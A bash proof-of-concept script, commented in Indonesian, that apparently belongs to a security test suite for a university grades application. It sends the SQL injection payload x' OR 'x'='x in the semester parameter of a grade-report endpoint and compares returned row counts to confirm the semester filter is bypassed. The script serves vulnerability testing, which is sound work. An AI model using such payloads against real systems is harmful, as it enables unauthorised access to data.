#!/usr/bin/env bash
# S3 - SQL Injection pada parameter semester di KHS (GET /api/nilai/me/khs?semester=)
# Sink: src/models/nilaiModel.js publishedBySemester() -> AND ks.semester = '${semester}'
# Prasyarat: peran mahasiswa, autentikasi diri sendiri.
set -euo pipefail
cd "$(dirname "$0")"
source ./00-login.sh
B="$BASE_URL"; ANH="Authorization: Bearer $ANDI_TOKEN"

echo "== Baseline: semester sah (2026-ganjil), hitung baris tabel =="
BASE_ROWS=$(curl -s -m 10 -G "$B/api/nilai/me/khs" --data-urlencode "semester=2026-ganjil" -H "$ANH" | grep -o '<tr>' | wc -l)
echo "baris: $BASE_ROWS"

echo "== Payload: semester=x' OR 'x'='x (lewati filter semester) =="
INJ_ROWS=$(curl -s -m 10 -G "$B/api/nilai/me/khs" --data-urlencode "semester=x' OR 'x'='x" -H "$ANH" | grep -o '<tr>' | wc -l)
echo "baris setelah injeksi: $INJ_ROWS"

echo
if [ "$INJ_ROWS" -gt "$BASE_ROWS" ]; then
  echo "KESIMPULAN: TERBUKTI. Payload mengembalikan $INJ_ROWS baris (vs $BASE_ROWS baseline), menampilkan nilai dari SEMUA semester dalam satu halaman, melewati filter semester yang diminta."
else
  echo "KESIMPULAN: TIDAK TERBUKTI pada percobaan ini."
fi
